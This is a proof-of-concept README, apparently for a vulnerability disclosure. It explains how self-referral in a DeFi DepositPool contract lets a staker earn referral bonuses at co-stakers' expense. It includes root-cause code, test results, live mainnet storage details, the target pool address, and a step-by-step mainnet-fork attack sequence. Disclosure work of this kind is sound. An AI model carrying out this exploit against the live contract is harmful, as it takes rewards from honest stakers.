# PoC — DepositPool Self-Referral Reward Manipulation

## What it proves
A staker who passes `referrer_ = msg.sender` to `DepositPool.stake()` earns a referral bonus
for referring *themselves*. Two users with **identical stakes** and **identical lock ends** end up
with **different reward claims** — the self-referrer over-earns at the expense of co-stakers.

The bug lives entirely in the real `DepositPool` + `ReferrerLib` source (copied verbatim into the
repo). Only the external `Distributor` and `RewardPool` are mocked, because (a) they are not where
the bug is, and (b) they let the PoC run in one command without a live yield stream. The mocked
`Distributor.supply()` replicates the real `safeTransferFrom(user, distributor, amount)` pull, so the
stake/claim flow is faithful.

## Run (one command, from clean clone)
```bash
forge test --match-contract SelfReferralTest -vv
```
No RPC needed for the isolated PoC. Result (4/4 pass):
```
[PASS] test_Control_NoReferral_FairSplit()          // 50/50 baseline (no referral)
[PASS] test_SelfReferral_EmptyTiers_CurrentState()  // 24.9 bps over-earn  <- LIVE mainnet state
[PASS] test_SelfReferral_OverEarning()              // 145.6 bps over-earn (5% tier)
[PASS] test_SelfReferral_DominantStake()            // 91.74% capture (10x + 5% tier)
```

## Why it works (root cause)
`DepositPool._stake()`:
```solidity
uint256 multiplier_ = _getUserTotalMultiplier(now, claimLockEnd, referrer_);
//  ^ getReferralMultiplier(referrer_) returns 1.01*PRECISION for ANY non-zero referrer,
//    including referrer_ == msg.sender (self). No check that referrer is a third party.
uint256 virtualDeposited_ = (amount_ * multiplier_) / PRECISION;   // staker's own weight +1%
...
_applyReferrerTier(rewardPoolIndex_, rate, 0, amount_, 0, referrer_, user_);
//  ^ credits referrer-tier virtual weight to `referrer_` — which is the staker themselves.
```
`ReferrerLib.getReferralMultiplier`:
```solidity
if (referrer_ == address(0)) return PRECISION;        // 1.00
return REFERRAL_MULTIPLIER;                            // 1.01  <- self-referrer gets this
```
So the staker's own stake is weighted at `1.01` (base) and, when tiers are configured, the staker
*also* receives the referrer-tier reward on that same stake. Both bonuses assume a genuine third
party was referred; self-referral double-dips.

## Current mainnet state (verified)
- `referrerTiers[pool]` is **empty** for all 5 in-scope pools (DepositPool storage slot 208,
  `keccak256(abi.encode(poolIndex, 208))` length = 0 for poolIndex 0..9).
- With empty tiers, `_getReferrerMultiplier` returns 0 (no tier bonus), **but the +1% base
  `REFERRAL_MULTIPLIER` still applies** for any non-zero referrer. → the live vector is the +1% base.
- stETH/WSTETH pool `0x47176B...` TVL ≈ 3,580 WSTETH; `Distributor.getDistributedRewards` shows
  ~1,000–2,000 MOR already distributed to the pool (rewards are actively flowing).

## Mainnet-fork reproduction (for vendor verification)
The isolated PoC above is the primary proof. To reproduce against live mainnet state:
```solidity
// Fork at a pinned block; attacker is any unprivileged EOA.
vm.createSelectFork(RPC_URL, PINNED_BLOCK);
address pool = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790; // stETH/WSTETH pool
// 1. Fund two fresh EOAs (attacker, honest) with WSTETH and approve the Distributor.
// 2. attacker: pool.stake(rewardPoolIndex, D, 0, attacker);   // SELF-referral
//    honest:   pool.stake(rewardPoolIndex, D, 0, address(0)); // no referral
// 3. vm.warp(block.timestamp + 1 days);                       // let WSTETH yield -> MOR accrue
// 4. both call pool.claim(rewardPoolIndex, user);
// 5. assert: mor.balanceOf(attacker) > mor.balanceOf(honest)  // identical stakes, attacker wins
```
(The only environment-specific step is funding the two EOAs with WSTETH; the vulnerability and the
asserted loss are independent of it.)

## Files
- `test/SelfReferral.t.sol` — the PoC (4 tests).
- `src/contracts/capital-protocol/DepositPool.sol` — real target source (bug site).
- `src/contracts/libs/ReferrerLib.sol` — real target source (bug site).
- `test/mocks/` — minimal `MockDistributor`, `MockRewardPool`, `MockToken` (external deps only).
